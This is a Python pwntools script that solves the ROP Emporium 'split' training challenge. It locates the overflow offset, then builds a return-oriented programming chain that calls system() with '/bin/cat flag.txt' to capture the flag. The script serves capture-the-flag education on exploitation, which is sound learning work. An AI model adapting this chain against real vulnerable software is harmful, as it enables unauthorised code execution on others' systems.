#!/usr/bin/env python3

# ROP Emporium - split solution using pwntools library
# Link: https://ropemporium.com/challenge/split.html
# Created by dilldylanpickle on 4-2-2023
# GitHub: https://github.com/dilldylanpickle
#
# Dependencies:
#   - Python 3.8.10 (https://www.python.org/downloads/release/python-3810/)
#   - Pwntools (https://github.com/Gallopsled/pwntools)
#   - ROPgadget (https://github.com/JonathanSalwan/ROPgadget)

import os           # Provides a way of using operating system dependent functionalities
import re           # Allows pattern matching and text processing through regex
from pwn import *   # Import Python3 library for accessing operating system functionality

def exploit(binary_path):

    # Create an ELF object and start a new process
    elf = context.binary = ELF(binary_path)

    # Set log level to debug if debugging is needed
    context.log_level = 'debug'

    # Automatically close the process when the "with" block is exited
    with process(elf.path) as io:

        # Load the cached gadgets for the binary
        rop = ROP(elf)

        # Get the address of the system() function
        system_addr = elf.symbols["system"]
        log.debug(f"The address of system() is {hex(system_addr)}")

        # Use ROPgadget to find the address of a "pop rdi ; ret" instruction
        pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret']).address
        log.debug(f"The address of ROP gadget pop rdi ; ret is {hex(pop_rdi)}")
        
        # Use ROPgadget to find the address of a "ret" instruction
        ret = rop.find_gadget(['ret'])[0]
        log.debug(f"The address of ROP gadget ret is {hex(ret)}")

        # Find the address of the "/bin/cat flag.txt" string
        string_addr = next(elf.search(b'/bin/cat flag.txt'))
        log.debug(f"The address of the /bin/cat flag.txt string is {hex(string_addr)}")

        # Get the offset by calling the find_offset() function
        offset = find_offset(binary_path)
        log.debug(f"The offset calculated overwrite RIP is {offset} bytes")

        # Construct the payload
        payload = b'\x69' * offset
        payload += p64(pop_rdi)
        payload += p64(string_addr)
        payload += p64(ret)
        payload += p64(system_addr)
        payload += p64(0x0)
        
        # Print the payload in hexadecimal representation for debugging purposes
        log.debug("The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))

        # Send the payload and print the output
        io.sendline(payload)
        output = io.clean().decode()
        log.info(output)

        # Use regular expression to search for the flag pattern
        flag_pattern = r'ROPE{[^}]+}'
        match = re.search(flag_pattern, output)

        # Verify if the ROP exploit was successful in capturing the flag 
        if match:
            flag = match.group(0)
            log.success(f"(SUCESS) The flag {flag} has been successfully captured!")
        else:
            log.failure("(FAILURE) You failed to capture the flag. Try a new payload!")


def find_offset(binary_path):

    # Save the original log level which would be either 'info' or 'debug'
    log_level = context.log_level

    # Disable logging for offset calculations
    context.log_level = 'error'

    # Create an ELF object and start a new process
    elf = context.binary = ELF(binary_path)
    
    # Automatically close the process when the "with" block is exited
    with process(elf.path) as io:

        # Send a cyclic pattern as input to the binary
        pattern = cyclic(69)
        io.sendline(pattern)
        io.wait()           

        # Get the corefile to extract the value of the instruction pointer (eip)
        core = io.corefile
        rip = core.rip

        # Find the offset by searching for the cyclic pattern in the eip value
        offset = cyclic_find(core.read(core.rsp, 4))

        # Revert the log level to the original value
        context.log_level = log_level

    # Return the calculated offset to overwrite the instruction pointer
    return offset

if __name__ == '__main__':
    binary_path = './split'
    warnings.filterwarnings("ignore", category=BytesWarning)
    exploit(binary_path)

    # Create a directory called 'core' if it does not already exist
    if not os.path.exists('Core_Dumps'):
        os.makedirs('Core_Dumps')

    # Move all files with the pattern 'core.*' to the 'core' directory
    for filename in os.listdir('.'):
        if filename.startswith('core.'):
            os.rename(filename, os.path.join('Core_Dumps', filename))
